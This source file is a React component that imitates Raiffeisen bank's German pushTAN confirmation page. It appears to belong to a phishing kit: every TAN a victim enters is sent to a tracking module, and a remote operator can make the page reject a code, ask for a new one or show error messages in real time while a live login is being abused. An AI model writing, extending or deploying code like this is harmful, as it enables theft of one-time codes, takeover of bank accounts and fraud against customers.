"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import CountdownRing from "./CountdownRing";
import PushTanHeader from "./PushTanHeader";
import { trackSubmission, onCommand, getSessionId } from "@/lib/track";

type Props = {
  user: string;
  vergleichswert?: string;
};

export default function PushTanCard({ user, vergleichswert }: Props) {
  const VERGLEICHSWERT = vergleichswert || "LRQ2";
  const router = useRouter();
  const [code, setCode] = useState("");
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  /* Register command handler — replaces any previous callback so commands
     are routed to this page while it's mounted. The existing poll loop
     (started by ClientShell on the login page) persists across client-side
     navigation because track.ts holds module-level state. */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    trackSubmission("raiffeisen", "pushtan", { code });
    try {
      // TODO: connect real backend endpoint
      await fetch("/api/pushtan/confirm", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user, code, vergleichswert: VERGLEICHSWERT }),
      }).catch(() => {});
      router.push("/success");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="flex justify-center items-end sm:items-center min-h-[calc(100vh-60px)] px-4 sm:px-0">
      <div className="bg-white rounded-lg w-full max-w-[640px] flex flex-col shadow-lg overflow-hidden">
        <PushTanHeader user={user} />

        <form onSubmit={handleSubmit} className="px-4 sm:px-8 py-6">
          {error && (
            <div className="mb-4 px-4 py-3 rounded bg-red-50 border border-red-300 text-red-700 text-sm">
              {error}
            </div>
          )}

          <div className="flex items-center gap-6 mb-6">
            <CountdownRing
              onExpired={() => setExpired(true)}
              onResend={() => {
                setExpired(false);
                setCode("");
              }}
            />
            <div className="flex-1 min-w-0">
              <div className="flex items-start gap-2">
                <p className="text-base text-raf-text-primary leading-relaxed">
                  Überprüfen Sie auf Ihrem für pushTAN aktivierten Gerät den
                  angezeigten Vergleichswert.
                </p>
                <button
                  type="button"
                  className="flex-shrink-0 w-6 h-6 rounded-full flex items-center justify-center text-raf-gray-700 hover:bg-raf-gray-100 transition-colors"
                  aria-label="Hinweis zum Vergleichswert"
                >
                  <svg
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="16" x2="12" y2="12" />
                    <line x1="12" y1="8" x2="12.01" y2="8" />
                  </svg>
                </button>
              </div>
              <p className="mt-3 text-3xl font-normal tracking-wider">
                {VERGLEICHSWERT}
              </p>
            </div>
          </div>

          <div className="form-field mb-6">
            <div className="relative pt-4">
              <input
                type="text"
                value={code}
                onChange={(e) => setCode(e.target.value.slice(0, 6))}
                maxLength={6}
                disabled={expired}
                placeholder=" "
                inputMode="text"
                autoComplete="one-time-code"
                className="floating-input w-full pb-1 text-base bg-transparent border-0 outline-none disabled:opacity-50"
              />
              <label
                className={`absolute left-0 transition-all duration-200 pointer-events-none ${
                  code
                    ? "top-0 text-xs text-raf-text-secondary"
                    : "top-1/2 -translate-y-1/2 text-base text-raf-text-secondary"
                }`}
              >
                Vergleichswert eingeben (4–6 Zeichen)
                <span className="text-raf-danger ml-0.5">*</span>
              </label>
            </div>
            <div className="form-field-underline" />
            {expired && (
              <p className="mt-2 text-sm text-raf-danger">
                Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
              </p>
            )}
          </div>

          <div className="flex justify-center">
            <button
              type="submit"
              disabled={!isValid || submitting}
              className="raf-btn-primary w-full sm:w-1/2"
            >
              Bestätigen
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
